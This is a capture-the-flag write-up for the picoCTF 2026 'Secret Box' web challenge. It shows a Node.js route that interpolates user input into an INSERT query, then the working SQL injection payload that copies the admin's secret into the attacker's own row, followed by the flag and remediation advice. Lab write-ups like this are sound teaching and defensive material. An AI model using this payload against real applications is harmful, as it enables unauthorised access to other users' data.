## Writeup: Secret Box (picoCTF 2026)

**Challenge Name:** Secret Box

**Category:** Web Exploitation

**Points:** 200

**Vulnerability:** SQL Injection (INSERT Statement)

---

### 1. Analysis

The challenge provides a web application where users can create "secrets." Upon reviewing the source code, specifically `app/src/server.js`, a critical vulnerability was found in the `POST /secrets/create` route:

JavaScript

```
app.post('/secrets/create', authMiddleware, async (req, res) => {
    const userId = req.userId;
    // ...
    const content = req.body.content;
    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
    );
    // ...
});
```

While other parts of the app used parameterized queries (`?`), this specific route used **string interpolation**. This allows an attacker to "break out" of the `content` string and manipulate the SQL command.

---

### 2. Database Schema

By checking `db/initdb.sql`, we identified the target:

- **Table:** `secrets`
    
- **Target Owner (Admin):** `e2a66f7d-2ce6-4861-b4aa-be8e069601cb`
    
- **Target Content:** The admin's secret (the flag).
    

---

### 3. Exploitation Strategy

The goal was to insert a new row into the `secrets` table where the `owner_id` is **our** ID, but the `content` is copied from the **admin's** row.

1. **Find our User ID:** By purposely triggering a syntax error (e.g., submitting a single quote `'`), the server's error logs revealed our `userId`: `aa02127f-375c-40f8-b6f4-c431f151d095`.
    
2. **Craft the Payload:** We used the following payload in the "Create Secret" content field:
    
    SQL
    
    ```
    dummy'), ('aa02127f-375c-40f8-b6f4-c431f151d095', (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1))--
    ```
    

**How it works:**

The resulting SQL query executed by the server became:

`INSERT INTO secrets(owner_id, content) VALUES ('my_id', 'dummy'), ('my_id', (SELECT content FROM secrets WHERE owner_id='admin_id'))--')`

- The `'),` closes the first set of values.
    
- The second set of values `('my_id', (SELECT ...))` inserts a new row that belongs to us but contains the flag.
    
- The `--` comments out the rest of the original query to prevent syntax errors.
    

---

### 4. Conclusion

After submitting the payload, the "My Secrets" page refreshed to show a new entry containing the flag.

**Flag:** `picoCTF{sq1_1nject10n_a8db399d}`

**Remediation:** Always use parameterized queries or an ORM to handle database interactions. Never concatenate or interpolate user-controlled strings directly into SQL queries.

---
_Writeup by: obito | picoCTF 2026_
